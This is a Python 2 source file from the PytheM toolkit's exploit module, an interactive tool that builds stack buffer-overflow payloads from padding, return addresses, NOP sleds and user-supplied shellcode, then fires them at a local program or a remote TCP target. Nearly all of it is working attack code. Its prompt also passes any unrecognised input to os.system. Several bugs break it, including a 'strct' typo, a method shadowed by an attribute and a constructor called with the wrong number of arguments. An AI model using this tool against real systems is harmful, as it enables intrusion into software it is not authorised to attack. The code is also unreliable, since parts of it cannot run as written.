#!/usr/bin/env python2.7

# Copyright (c) 2016 Angelo Moura
#
# This file is part of the program PytheM
#
# PytheM is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA


import os
import sys
import struct
import resource
import time
from netaddr import IPAddress, AddrFormatError
from subprocess import *
from socket import *



class Exploit(object):

	def __init__(self, target, mode):
		self.target = target
		self.mode = mode
		self.xtype = 'bufferoverflow'
		self.offset = 0
		self.nops = 0
		self.shellcode = ''
		self.lenght = 0
		self.returnaddr = None
		self.overwriteaddr = None
		self.arch = 'x86'
		self.port = 0

	def printHelp(self):
		print """\n


		[PytheM - Xploit module]

	TARGET - [ {} ]

[*] help:		Print this help message

[*] clear:		Clean the screen, same as GNU/Linux OS "clear"

[*] exit/quit:		Return to pythem

[*] xploit		Run the exploit after all the settings

[*] set			Set the variables values.

parameters:

  - offset			| Number os 'A's to overwrite the instruction pointer.

  - return-addr			| (Optional) Hexa(0xaddress) Of the return function that will overwrite the IP.

  - overwrite-addr		| (Optional) Hexa(0xaddress) Call pointer to desired function.

  - nops			| (Optional) Number of NOPs after IP overwrite or after the overwrite-addr if overwrite-addr is set.

  - shellcode			| (Optional) Shellcode (could be generated by msfvenom or any other)

  - lenght			| Total lenght of the payload.

  - arch			| Target system processor architecture.


"""


	def pattern(self,size=1024):
		return "\x41"*size

	def nops(self,size=1024):
		return "\x90"*size

	def int2hexstr(self, num, intsize=4):
		if intsize == 8:
			if num < 0:
				result = strct.pack("<q", num)
			else:
				result = struct.pack("<Q", num)

		else:
			if num < 0:
				result = struct.pack("<l", num)
			else:
				result = struct.pack("<L", num)
		return result

	def list2hexstr(self, intlist, intsize=4):
		result = ""
		for value in intlist:
			if isinstance(value, str):
				result += value
			else:
				result += self.int2hexstr(value, intsize)
		return result

	def run(self):

		padding = self.pattern(self.offset)
		payload = [padding]


		if self.xtype == "bufferoverflow":
			if self.arch == "x86":
				if self.returnaddr is not None:
					payload += [self.returnaddr]
				if self.overwriteaddr is not None:
					payload += [self.overwriteaddr]
				if self.nops > 0:
					payload += ["{}".format(self.nops(self.nops))]
				payload += [self.shellcode]
				total = len(payload) - self.lenght
				fill = self.pattern(total)
				payload += [fill]
				payload = self.list2hexstr(payload)
				print "[+] Writing payload into buffer.txt"
				f = open("buffer.txt", "w")
				f.write(payload)

			elif self.arch == "x64":
				if self.returnaddr is not None:
					payload += struct.pack("<Q",int(self.returnaddr))
				if self.overwriteaddr is not None:
					payload += struct.pack("<Q",int(self.overwriteaddr))
				if self.nops > 0:
					payload += ["{}".format(self.nops(self.nops))]
				payload += [self.shellcode]
				total = len(payload) - self.lenght
				fill = self.pattern(total)
				payload += [fill]
				payload = self.list2hexstr(payload, 8)
				print "\n[+] Writing payload into buffer.txt\n"
				f = open("buffer.txt", "w")
				f.write(payload)
			else:
				print "[!] Select a valid processor architecture."
				return


		if self.mode == "tcp":
			self.port = input("[+] Enter the tcp port to fuzz: ")
			self.tcppwn(payload)

		elif self.mode == "stdin":
			self.stdinpwn(payload)
		else:
			print "[!] Select a valid mode (stdin or tcp)."

	def stdinpwn(self, payload):
		resource.setrlimit(resource.RLIMIT_STACK, (-1, -1))
                resource.setrlimit(resource.RLIMIT_CORE, (-1, -1))
                P = Popen(self.target, stdin=PIPE)
                print "[*] Sending buffer with lenght: "+str(len(payload))
		P.stdin.write(payload)
		while True:
			line = sys.stdin.readline()
			P.poll()
			ret = P.returncode
			if ret is None:
				P.stdin.write(line)
			else:
				if ret == -11:
					print "[*] Child program crashed with SIGSEGV"
				else:
					print "[-] Child program exited with code %d" % ret
				break
		print "\nTo check exploit, run on terminal: $(cat buffer.txt ; cat) | {}".format(self.target)
		exit()

	def tcppwn(self, payload):
		try:
			self.target = str(IPAddress(self.target))
		except AddrFormatError as e:
			print "[-] Select a valid IP Address as target."
			return

		try:
			self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			self.socket.settimeout(4)
			self.socket.connect((self.target,self.port))
			self.socket.send(payload)
			while True:
				self.socket.recv(1024)
		except KeyboardInterrupt:
			return

		except Exception as e:
			if 'Connection refused' in e:
				print "[-] Connection refused."
				return


	def start(self):
		while True:
			try:
				self.command = raw_input("xploit> ")
				self.argv = self.command.split()
				self.input_list = [str(a) for a in self.argv]

				try:
					if self.input_list[0] == 'exit' or self.input_list[0] == 'quit':
						break

					elif self.input_list[0] == 'help':
						self.printHelp()

					elif self.input_list[0] == 'xploit':
						self.run()


					elif self.input_list[0] == "set" or self.input_list[0] == "SET":

						if self.input_list[1] == "offset":
							try:
								self.offset = int(self.input_list[2])
							except IndexError:
								try:
									self.offset = input("[+] Enter the offset (number of 'A's): ")
								except KeyboardInterrupt:
									pass

						elif self.input_list[1] == "nops":
							try:
								self.nops = int(self.input_list[2])
							except IndexError:
								try:
									self.nops = input("[+] Enter the NOPsled (number of NOPs): ")

								except KeyboardInterrupt:
									pass

						elif self.input_list[1] == "shellcode":
							try:
								self.shellcode = input("[+] Enter the shellcode: ")
							except KeyboardInterrupt:
								pass

						elif self.input_list[1] == "lenght":
							try:
								self.lenght = int(self.input_list[2])
							except IndexError:
								try:
									self.lenght = input("[+] Enter the payload total lenght: ")
								except KeyboardInterrupt:
									pass

						elif self.input_list[1] == "overwrite-addr":
							try:
								self.overwriteaddr = input("[+] Overwrite with address: ")
							except KeyboardInterrupt:
								pass

						elif self.input_list[1] == "return-addr":
							try:
								self.returnaddr = input("[+] Return address: ")
							except KeyboardInterrupt:
								pass

						elif self.input_list[1] == "arch":
							try:
								self.arch = self.input_list[2]
							except IndexError:
								try:
									self.arch = raw_input("[+] Target system arch: ")
								except KeyboardInterrupt:
									pass

					else:
						try:
							os.system("{}".format(self.command))
							pass
						except Exception as e:
							print "[!] Select a valid option, type help to check sintax."
							pass

				except IndexError:
					pass
				except Exception as e:
					print "[!] Exception caught: {}".format(e)



			except KeyboardInterrupt:
				break

if __name__ == "__main__":
	xploit = Exploit("./vuln")
	xploit.start()
